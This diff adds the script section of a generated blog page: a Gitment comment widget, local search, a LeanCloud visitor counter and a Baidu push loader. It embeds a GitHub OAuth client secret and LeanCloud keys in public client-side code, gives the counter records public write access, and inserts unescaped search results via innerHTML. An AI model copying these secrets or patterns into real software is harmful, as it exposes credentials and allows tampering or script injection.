+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://jjeejj.github.io/css/gitment.css">
+        <script src="https://jjeejj.github.io/js/gitment.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitment({
+            id: window.location.pathname,
+            owner: 'Cool-Y',
+            repo: 'gitment-comments',
+            
+            oauth: {
+            
+            
+                client_secret: '1c5db4da72df5e6fc318d12afe5f4406f7c54343',
+            
+                client_id: '180955a2c3ae3d966d9a'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("EWwoJgHNdlj6iBjiFlMcabUO-gzGzoHsz", "x8FxDrYG79C8YFrTww9ljo8K");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
